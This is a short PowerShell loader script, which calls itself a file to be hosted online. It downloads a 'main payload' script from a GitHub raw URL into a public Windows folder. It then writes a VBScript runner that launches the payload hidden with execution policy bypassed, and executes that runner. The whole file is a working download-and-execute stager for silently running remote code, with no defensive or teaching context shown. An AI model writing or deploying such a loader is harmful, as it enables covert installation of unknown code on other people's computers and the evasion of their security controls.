# loader.ps1 - This is the script you will host online.

# 1. Download the main payload (your original teste.ps1)
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/icesousa/raspberry/main/teste.ps1' -OutFile 'C:\Users\Public\teste.ps1'

# 2. Create the VBS runner to execute the script silently.
# Note: The VBS script executes your downloaded .ps1 file.
$vbsPayload = 'CreateObject("Wscript.Shell").Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\teste.ps1", 0, false'
Set-Content -Path 'C:\Users\Public\run.vbs' -Value $vbsPayload

# 3. Execute the VBS script to run the payload.
Start-Process 'C:\Users\Public\run.vbs'